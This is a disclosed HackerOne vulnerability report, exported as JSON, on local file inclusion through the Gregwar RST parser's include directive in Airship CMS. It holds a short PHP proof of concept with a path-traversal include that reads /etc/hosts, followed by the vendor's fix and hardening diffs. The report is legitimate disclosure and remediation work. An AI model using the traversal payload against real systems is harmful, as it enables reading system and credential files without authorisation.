{"id":179034,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzkwMzQ=","url":"https://hackerone.com/reports/179034","title":"[Airship CMS] Local File Inclusion - RST Parser","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2016-10-30T23:33:43.551Z","submitted_at":"2016-10-30T23:33:43.551Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"h4ckninja","url":"/h4ckninja","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8539,"url":"https://hackerone.com/paragonie","handle":"paragonie","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/008/539/72f76fed45e5220b47ba2f679371ebf9ccb19c70_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/539/72f76fed45e5220b47ba2f679371ebf9ccb19c70_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Paragon Initiative Enterprises","twitter_handle":"ParagonIE","website":"https://github.com/paragonie","about":"Cryptography and Application Security Consultants - We Produce Various Open Source Libraries"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-10-31T13:00:04.983Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2016-10-31T12:59:43.485Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Airship uses the very useful RST Parser from Gregwar. However, the parser has the RST directive `include` built-in (why it isn't a separate directive per the spec, I don't know). However, as a result, LFI is possible in Airship.\n\nI realize this isn't directly Paragonie's code, but since Airship uses this library, I wanted to let you know. I found two instances in the Airship codebase and don't appear to take this side effect in to account:\n\nhttps://github.com/paragonie/airship/blob/58f96aa0e5002b60e74456502d9bfc9483d77b3d/src/Cabin/Hull/Landing/CustomPages.php#L186\n\nhttps://github.com/paragonie/airship/blob/58f96aa0e5002b60e74456502d9bfc9483d77b3d/src/lens_functions.php#L714\n\nThe parser has this problem here:\n\nhttps://github.com/Gregwar/RST/blob/master/Parser.php#L762. There doesn't appear to be a way for users of this library to turn it off short of re-implementing their own parser. The spec itself recognizes this security impact: http://docutils.sourceforge.net/docs/ref/rst/directives.html#include.\n\nTo demonstrate:\n\n`rst.php`:\n\n~~~\n\u003c?php\n\nrequire('autoload.php');\n\n\n$parser = new Gregwar\\RST\\Parser;\n\n// RST document\n$document = '*Test*\n\n.. include:: /./../../../../../../../../../../../../../../../../../../etc/hosts\n\n``test``\n';\n\n// Parse it\n$html = $parser-\u003eparse($document);\n\n// Render it\necho $html;\n~~~\n\nOutput:\n\n~~~\n$ php rst.php\n\u003cp\u003e\u003cem\u003eTest\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e##\n# Host Database\n#\n# localhost is used to configure the loopback interface\n# when the system is booting.  Do not change this entry.\n##\n127.0.0.1\tlocalhost\n255.255.255.255\tbroadcasthost\n::1             localhost \u003c/p\u003e\n\n[...]\n~~~\n\n\n\n","vulnerability_information_html":"\u003cp\u003eAirship uses the very useful RST Parser from Gregwar. However, the parser has the RST directive \u003ccode\u003einclude\u003c/code\u003e built-in (why it isn\u0026#39;t a separate directive per the spec, I don\u0026#39;t know). However, as a result, LFI is possible in Airship.\u003c/p\u003e\n\n\u003cp\u003eI realize this isn\u0026#39;t directly Paragonie\u0026#39;s code, but since Airship uses this library, I wanted to let you know. I found two instances in the Airship codebase and don\u0026#39;t appear to take this side effect in to account:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://github.com/paragonie/airship/blob/58f96aa0e5002b60e74456502d9bfc9483d77b3d/src/Cabin/Hull/Landing/CustomPages.php#L186\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fparagonie%2Fairship%2Fblob%2F58f96aa0e5002b60e74456502d9bfc9483d77b3d%2Fsrc%2FCabin%2FHull%2FLanding%2FCustomPages.php%23L186\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/paragonie/airship/blob/58f96aa0e5002b60e74456502d9bfc9483d77b3d/src/Cabin/Hull/Landing/CustomPages.php#L186\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://github.com/paragonie/airship/blob/58f96aa0e5002b60e74456502d9bfc9483d77b3d/src/lens_functions.php#L714\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fparagonie%2Fairship%2Fblob%2F58f96aa0e5002b60e74456502d9bfc9483d77b3d%2Fsrc%2Flens_functions.php%23L714\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/paragonie/airship/blob/58f96aa0e5002b60e74456502d9bfc9483d77b3d/src/lens_functions.php#L714\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe parser has this problem here:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://github.com/Gregwar/RST/blob/master/Parser.php#L762\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FGregwar%2FRST%2Fblob%2Fmaster%2FParser.php%23L762\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/Gregwar/RST/blob/master/Parser.php#L762\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. There doesn\u0026#39;t appear to be a way for users of this library to turn it off short of re-implementing their own parser. The spec itself recognizes this security impact: \u003ca title=\"http://docutils.sourceforge.net/docs/ref/rst/directives.html#include\" href=\"/redirect?url=http%3A%2F%2Fdocutils.sourceforge.net%2Fdocs%2Fref%2Frst%2Fdirectives.html%23include\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://docutils.sourceforge.net/docs/ref/rst/directives.html#include\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eTo demonstrate:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003erst.php\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;autoload.php\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\n\u003cspan class=\"nv\"\u003e$parser\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eGregwar\\RST\\Parser\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e// RST document\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$document\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;*Test*\n\n.. include:: /./../../../../../../../../../../../../../../../../../../etc/hosts\n\n``test``\n\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e// Parse it\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$html\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$parser\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"na\"\u003eparse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$document\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e// Render it\u003c/span\u003e\n\u003cspan class=\"k\"\u003eecho\u003c/span\u003e \u003cspan class=\"nv\"\u003e$html\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOutput:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ php rst.php\n\u0026lt;p\u0026gt;\u0026lt;em\u0026gt;Test\u0026lt;/em\u0026gt;\u0026lt;/p\u0026gt;\n\u0026lt;p\u0026gt;##\n# Host Database\n#\n# localhost is used to configure the loopback interface\n# when the system is booting.  Do not change this entry.\n##\n127.0.0.1   localhost\n255.255.255.255 broadcasthost\n::1             localhost \u0026lt;/p\u0026gt;\n\n[...]\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-11-30T12:59:43.528Z","allow_singular_disclosure_after":-128706278.46609533,"singular_disclosure_allowed":true,"vote_count":6,"voters":["static","madrobot","muhammad_uwais","ibram","bastianwelfrid","spetr0x"],"severity":{"rating":"high","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1275282,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Full acknowledgement.\n\nAlthough this is in a downstream library and not part of our code, this is a valid security concern that needs to be mitigated ASAP.\n\nSome immediate ideas:\n\n1. Fork and disable this directive.\n2. Create a RST snippet directory and only allow files whose realpath resolves to that directory. This will allow users to create their own RST snippets if they *really* want this functionality, but default to the equivalent of being disabled outright.","markdown_message":"\u003cp\u003eFull acknowledgement.\u003c/p\u003e\n\n\u003cp\u003eAlthough this is in a downstream library and not part of our code, this is a valid security concern that needs to be mitigated ASAP.\u003c/p\u003e\n\n\u003cp\u003eSome immediate ideas:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eFork and disable this directive.\u003c/li\u003e\n\u003cli\u003eCreate a RST snippet directory and only allow files whose realpath resolves to that directory. This will allow users to create their own RST snippets if they \u003cem\u003ereally\u003c/em\u003e want this functionality, but default to the equivalent of being disabled outright.\u003c/li\u003e\n\u003c/ol\u003e\n","automated_response":false,"created_at":"2016-10-30T23:44:15.009Z","updated_at":"2016-10-30T23:44:15.009Z","actor":{"username":"paragonie-scott","cleared":false,"url":"/paragonie-scott","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/441/089de22b2f1b80a1e57a2792318dede5cbad81db_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"paragonie","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1275881,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"https://github.com/Gregwar/RST/pull/34 - Contributed the fix upstream, waiting for a new release to be tagged before I tag and release Airship v1.3.2.","markdown_message":"\u003cp\u003e\u003ca title=\"https://github.com/Gregwar/RST/pull/34\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FGregwar%2FRST%2Fpull%2F34\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/Gregwar/RST/pull/34\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e - Contributed the fix upstream, waiting for a new release to be tagged before I tag and release Airship v1.3.2.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-10-31T12:08:50.585Z","updated_at":"2016-10-31T12:08:50.585Z","actor":{"username":"paragonie-scott","cleared":false,"url":"/paragonie-scott","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/441/089de22b2f1b80a1e57a2792318dede5cbad81db_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"h4ckninja","url":"/h4ckninja"},"genius_execution_id":null,"team_handle":"paragonie","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1275957,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-10-31T12:59:43.507Z","updated_at":"2016-10-31T12:59:43.507Z","first_to_agree":true,"actor":{"username":"paragonie-scott","cleared":false,"url":"/paragonie-scott","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/441/089de22b2f1b80a1e57a2792318dede5cbad81db_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"paragonie","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1275958,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"Thanks. v1.3.2 is released; disclosing fully.","markdown_message":"\u003cp\u003eThanks. v1.3.2 is released; disclosing fully.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-10-31T13:00:04.960Z","updated_at":"2016-10-31T13:00:04.960Z","actor":{"username":"paragonie-scott","cleared":false,"url":"/paragonie-scott","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/441/089de22b2f1b80a1e57a2792318dede5cbad81db_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"paragonie","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1276008,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"To anyone else reading this that uses Gregwar/RST, upgrading to v1.0.3 is not enough. You'll need to do a little bit more:\n\n### Disable File Inclusion\n\n```diff\n- $parser = new Gregwar\\RST\\Parser();\n+ $parser = (new Gregwar\\RST\\Parser())\n+     -\u003esetIncludePolicy(false);\n```\n\n### Jail File Inclusion to a Specific Directory\n\n```diff\n- $parser = new Gregwar\\RST\\Parser();\n+ $parser = (new Gregwar\\RST\\Parser())\n+     -\u003esetIncludePolicy(true, '/path/to/rst/jail');\n```\n\nNote that this supports the same syntax as PHP's open_basedir (joined with a `:` separator)\n\n```diff\n- $parser = new Gregwar\\RST\\Parser();\n+ $parser = (new Gregwar\\RST\\Parser())\n+     -\u003esetIncludePolicy(\n+         true,\n+         implode(':', [\n+             '/var/www/common/rst-snippets',\n+             '/var/www/example.com/rst-snippets'\n+         ])\n+ );\n```\n\n### General Recommendations\n\n* If you're loading RST templates from a database, disable `include`. This is what Airship does.\n* If you're loading RST templates from the filesystem and need `include` for snippets, jail all includes to within a common directory.","markdown_message":"\u003cp\u003eTo anyone else reading this that uses Gregwar/RST, upgrading to v1.0.3 is not enough. You\u0026#39;ll need to do a little bit more:\u003c/p\u003e\n\n\u003ch3 id=\"disable-file-inclusion\"\u003eDisable File Inclusion\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gd\"\u003e- $parser = new Gregwar\\RST\\Parser();\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+ $parser = (new Gregwar\\RST\\Parser())\n+     -\u0026gt;setIncludePolicy(false);\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch3 id=\"jail-file-inclusion-to-a-specific-directory\"\u003eJail File Inclusion to a Specific Directory\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gd\"\u003e- $parser = new Gregwar\\RST\\Parser();\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+ $parser = (new Gregwar\\RST\\Parser())\n+     -\u0026gt;setIncludePolicy(true, \u0026#39;/path/to/rst/jail\u0026#39;);\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNote that this supports the same syntax as PHP\u0026#39;s open_basedir (joined with a \u003ccode\u003e:\u003c/code\u003e separator)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gd\"\u003e- $parser = new Gregwar\\RST\\Parser();\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+ $parser = (new Gregwar\\RST\\Parser())\n+     -\u0026gt;setIncludePolicy(\n+         true,\n+         implode(\u0026#39;:\u0026#39;, [\n+             \u0026#39;/var/www/common/rst-snippets\u0026#39;,\n+             \u0026#39;/var/www/example.com/rst-snippets\u0026#39;\n+         ])\n+ );\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch3 id=\"general-recommendations\"\u003eGeneral Recommendations\u003c/h3\u003e\n\n\u003cul\u003e\n\u003cli\u003eIf you\u0026#39;re loading RST templates from a database, disable \u003ccode\u003einclude\u003c/code\u003e. This is what Airship does.\u003c/li\u003e\n\u003cli\u003eIf you\u0026#39;re loading RST templates from the filesystem and need \u003ccode\u003einclude\u003c/code\u003e for snippets, jail all includes to within a common directory.\u003c/li\u003e\n\u003c/ul\u003e\n","automated_response":false,"created_at":"2016-10-31T13:30:23.829Z","updated_at":"2016-10-31T13:30:23.829Z","actor":{"username":"paragonie-scott","cleared":false,"url":"/paragonie-scott","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/441/089de22b2f1b80a1e57a2792318dede5cbad81db_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"paragonie","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1653840,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"This was not a vulnerability in our code itself, but the report here allowed us to get a fix in the upstream library.","markdown_message":"\u003cp\u003eThis was not a vulnerability in our code itself, but the report here allowed us to get a fix in the upstream library.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-04T14:18:27.632Z","updated_at":"2017-05-04T14:18:27.632Z","actor":{"url":"/paragonie","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/539/72f76fed45e5220b47ba2f679371ebf9ccb19c70_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Paragon Initiative Enterprises"}},"genius_execution_id":null,"team_handle":"paragonie","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}